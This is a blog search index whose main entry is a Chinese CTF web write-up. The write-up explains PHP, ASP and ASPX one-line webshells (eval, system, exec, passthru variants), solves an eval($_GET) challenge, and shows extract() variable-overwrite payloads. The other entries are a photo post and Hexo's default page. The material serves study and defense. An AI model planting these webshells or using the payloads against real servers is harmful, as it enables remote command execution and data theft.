<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>web-writeup</title>
      <link href="web-writeup/"/>
      <url>web-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="web-writeup"><a href="#web-writeup" class="headerlink" title="web-writeup"></a><strong>web-writeup</strong></h1><img src="/web-writeup/3.jpeg" alt="iceland" style="zoom: 50%;"><h2 id="basic-rce"><a href="#basic-rce" class="headerlink" title="basic rce"></a><strong>basic rce</strong></h2><p><a href="http://www.henuctf.com:2077/yijuhua/">http://www.henuctf.com:2077/yijuhua/</a></p><h3 id="一-审题"><a href="#一-审题" class="headerlink" title="一.审题"></a>一.审题</h3><p>该题是考察一句话木马。查找资料后发现这题有点像【bugkuctf】过狗一句话，hack在目标服务器已经放置好了一句话木马，题中有个<code>eval($_GET['a'])函数</code>，这标志着我们只需要利用好这个木马，读取flag文件。但没解出来。</p><h3 id="二-学习笔记"><a href="#二-学习笔记" class="headerlink" title="二.学习笔记"></a>二.学习笔记</h3><h4 id="1-什么是一句话木马"><a href="#1-什么是一句话木马" class="headerlink" title="1.什么是一句话木马"></a>1.什么是一句话木马</h4><ol><li>文件上传是大部分web应用都具备的功能，如用户上传文件，头像等。</li><li>正常上传的文件一般是图片文档视频等，web应用收集后放在后台，等待用户调用返回</li><li>如果恶意文件如PHP、ASP等执行文件绕过web应用并顺利执行，则相当于hacker直接拿到webshell</li><li>一旦hacker拿到了webshell，则可以拿到web应用的数据，删除web文件，本地提取，进一步拿下整个服务器甚至内网</li><li>SQL注入的对象是数据库服务，而文件上传漏洞主要攻击web服务，两种渗透相结合以达到对目标深度控制</li><li>常用的工具为中国菜刀和中国蚁剑</li></ol><h4 id="2-入侵条件"><a href="#2-入侵条件" class="headerlink" title="2.入侵条件"></a>2.入侵条件</h4><pre><code>（1）木马上传成功，未被杀；（2）知道木马的路径在哪；（3）上传的木马能正常运行。</code></pre><h4 id="3-漏洞成因"><a href="#3-漏洞成因" class="headerlink" title="3.漏洞成因"></a>3.漏洞成因</h4><p>文件上传漏洞的成因，一方面服务器配置不当会导致任意文件上传；另一方面，Web 应用开放了文件上传功能，并且对上传的文件没有进行足够的限制；再者就是程序开发部署时候，没有考虑到系统特性和验证过滤不严格而导致限制被绕过，上传任意文件。</p><h4 id="4-webshell"><a href="#4-webshell" class="headerlink" title="4.webshell"></a>4.webshell</h4><h5 id="a-定义"><a href="#a-定义" class="headerlink" title="a.定义"></a>a.定义</h5><p>在计算机科学中，Shell 俗称壳（用来区别“核”），是指“为使用者提供操作界面”的软件（命令解释器）。类似于windows 系统给的cmd.exe 或者Linux 下bash 等，虽然这些系统的命令解释器不止一种。</p><p>webshell是以asp、php、jsp等网页文件形式存在的一种命令执行环境，也称其为一种网页后门。一般说来，当Hacker入侵一个网站后，会把这些asp、php木马的后门文件放在该网站的web目录中，和正常的网页文件混杂，其命名可能和正常的文件命名很类似，让人无法第一眼通过文件名判断其为后门文件。然后呢，他就可以利用web请求的方式，用asp或者php木马后门控制网站服务器，包括上传下载文件、查看数据库、执行任意程序命令等一系列操作。</p><h5 id="b-分类"><a href="#b-分类" class="headerlink" title="b.分类"></a>b.分类</h5><ol><li><p><strong>大马</strong>    就是网站木马。有一类WebShell 之所以叫大马，是因为与小马（一句话木马）区分开，并且代码量较大，但是功能丰富。同样，大马又很多脚本格式，其功能基本相同。每个团队都有自己的定制木马。</p><p>在大马中，我们可以进行文件管理，执行系统命令等，还有一些其他定制功能。</p></li><li><p><strong>小马</strong>    小马就是一句话木马，因为其代码量比较小，就是一句简单的代码，<u><em>短小精悍</em></u>。常见的小马：</p><ul><li><p>php的一句话木马： <code>&lt;?php @eval($_POST['pass']);?&gt;</code> </p></li><li><p>asp的一句话是：   <code>&lt;%eval request ("pass")%&gt;</code> </p></li><li><p>aspx的一句话是：  </p><pre><code>&lt;%@ Page Language="Jscript"%&gt; &lt;%eval(Request.Item["pass"],"unsafe");%&gt;</code></pre></li></ul></li></ol><p>   而本题涉及的是php小马，所以搜寻了一些php小马方式：</p><p>   1.<strong>system()</strong></p><pre><code>&lt;?php$cmd = $_GET['cmd'];system($cmd);?&gt;    //调用system来执行命令</code></pre><p>   2.<strong>exec()</strong></p><pre><code>&lt;?php$cmd = $_GET['cmd'];echo exec($cmd);?&gt;   //调用exec执行命令</code></pre><p>   3.<strong>passthru()</strong></p><pre><code>&lt;?php$cmd = $_GET['cmd']; passthru($cmd); ?&gt;      //调用passthru执行命令</code></pre><p>   4.<strong>echo <code>$cmd</code></strong></p><pre><code>&lt;?php$cmd = $_GET[‘cmd’] ;echo `$cmd`;?&gt;  //调用echo执行命令</code></pre><p>   5.<strong>eval()</strong></p><pre><code>&lt;?php$cmd = =_GET[‘cmd’] ;eval($cmd)?&gt;   //通过eval执行命令</code></pre><hr><h4 id="本题分析"><a href="#本题分析" class="headerlink" title="本题分析"></a><strong>本题分析</strong></h4><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token comment" spellcheck="true">//拿到flag就不要乱玩了哦~ </span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>拿本题来看，这是属于第5种类型。<code>$_GET['a']</code>是指目标服务器中小马的密码为<code>a</code> ；<code>show_source(__FILE__);</code>指当使用该函数时，整个文件都将被显示；<code>eval()</code>则是把字符串作为PHP代码执行,例如：<code>eval("echo 'a'")</code>;其实就等于直接 <code>echo 'a'</code>;再来看看<code>&lt;?php eval($_GET['a']); ?&gt;</code>首先，用get方式接收变量a，比如接收到了：a=echo ‘a’;这时代码就变成<code>&lt;?php eval("echo 'a';"); ?&gt;</code>。也就是说，你想执行什么代码，就把什么代码放进变量a里，用GET传输给一句话木马，你想查看目标硬盘里的文件，可以用php函数：<code>opendir()</code>和<code>readdir()</code>等等。<code>?a=print_r(scandir('./'));</code> 扫描目录 </p><hr><hr><h2 id="php变量覆盖"><a href="#php变量覆盖" class="headerlink" title="php变量覆盖"></a>php变量覆盖</h2><p><a href="http://a16ne.cn:1002/">http://a16ne.cn:1002/</a></p><h3 id="一-审题，做题分析"><a href="#一-审题，做题分析" class="headerlink" title="一.审题，做题分析"></a>一.审题，做题分析</h3><p>由题目可知这是php的变量覆盖，百度后知道变量覆盖漏洞指的是可以用我们的传参值替换原有的变量值。百度后可以大致分析出代码。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$flag</span><span class="token operator">=</span><span class="token string">'xxxxxxxx'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//给变量flag赋一个值</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//extract函数（变量覆盖的标志），并用get传参</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$liwu</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//判断是否声明了变量 liwu      </span>    <span class="token variable">$content</span><span class="token operator">=</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//file_get_contents函数指打开输出这个文件的内容，而打开的文件名即为赋给flag的值；   trim函数是移除字符串两侧的空白字符或其他预定义字符。功能除去字符串开头和末尾的空格或其他字符。如：" abc "会变成"abc"(无关紧要)； $content=，也是赋值 </span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$liwu</span><span class="token operator">==</span><span class="token variable">$content</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//判断两个变量是否绝对相等</span>        <span class="token keyword">echo</span><span class="token string">'flag{xxxxxxxxxxx}'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//相等则输出flag</span>    <span class="token punctuation">}</span>     <span class="token keyword">else</span> <span class="token punctuation">{</span> <span class="token keyword">echo</span> <span class="token string">'please try other operation.'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//错误则输出。。。</span>         <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以解这题的关键就是使两个变量相等，而flag是已经确定的变量但是我们不知道，不过extract函数的作用就是可以把flag的值给覆盖掉。其中最普遍的方法就是给<code>flag</code>赋一个空值，而文件显示也会变空值，最后<code>content</code>变量也就为空，接着给<code>liwu</code>也赋个空值就相等了。payload：?flag=&amp;liwu=  ; 想了下也可直接，?content=&amp;liwu= ；还可以给flag随便赋一个值，只要是目标服务器中没有的文件名就可，如 ?flag=123&amp;liwu=</p><h3 id="二-学习笔记-1"><a href="#二-学习笔记-1" class="headerlink" title="二.学习笔记"></a>二.学习笔记</h3><h4 id="1-extract-变量覆盖"><a href="#1-extract-变量覆盖" class="headerlink" title="1.extract()变量覆盖"></a>1.extract()变量覆盖</h4><p>extract()函数能将变量从数组导入当前的符号表，定义：extract(array,extract_rules,prefix)</p><pre><code>array 必需。规定要使用的数组extract_rules 可选。extract() 函数将检查每个键名是否为合法的变量名，同时也检查和符号表中已存在的变量名是否冲突。对不合法和冲突的键名的处理将根据此参数决定前缀和数组键名之间会自动加上一个下划线</code></pre><p>该函数的作用：使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。做了一道题，如：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">"REQUEST_METHOD"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token delimiter">?></span> <span class="token comment" spellcheck="true">//判断传参方式为post</span>            <span class="token delimiter">&lt;?php</span>            <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$pass</span> <span class="token operator">==</span> <span class="token variable">$thepassword_123</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token delimiter">?></span> <span class="token comment" spellcheck="true">//判断输入的pass和已有的thepassword（未知）两个变量是否相等</span>              <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>alert alert-success<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>                <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>code</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$theflag</span><span class="token punctuation">;</span> <span class="token delimiter">?></span>       <span class="token comment" spellcheck="true">//相等就输出flag   &lt;/code></span>              <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>            <span class="token delimiter">&lt;?php</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span>          <span class="token delimiter">&lt;?php</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>虽然我们不知道<code>thepassword_123</code>的值，但是extract函数可以覆盖它，所以payload：pass=a&amp;password_123=a</p><p>类似的还有<strong>parse_str()变量覆盖</strong>     <strong>import_request_variables()变量覆盖</strong>   <strong>$$使用不当</strong></p><p> <a href="https://blog.csdn.net/qq_35569814/article/details/100588340">https://blog.csdn.net/qq_35569814/article/details/100588340</a></p>]]></content>
      
      
      <categories>
          
          <category> weblearning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>myimages</title>
      <link href="post-my-site/"/>
      <url>post-my-site/</url>
      
        <content type="html"><![CDATA[<p><img src="/post-my-site/1.jpg" alt="冰岛"></p><img src="/post-my-site/2.jpg" alt="post" style="zoom: 80%;">]]></content>
      
      
      <categories>
          
          <category> gallery </category>
          
      </categories>
      
      
        <tags>
            
            <tag> iceland </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="hello-world/"/>
      <url>hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
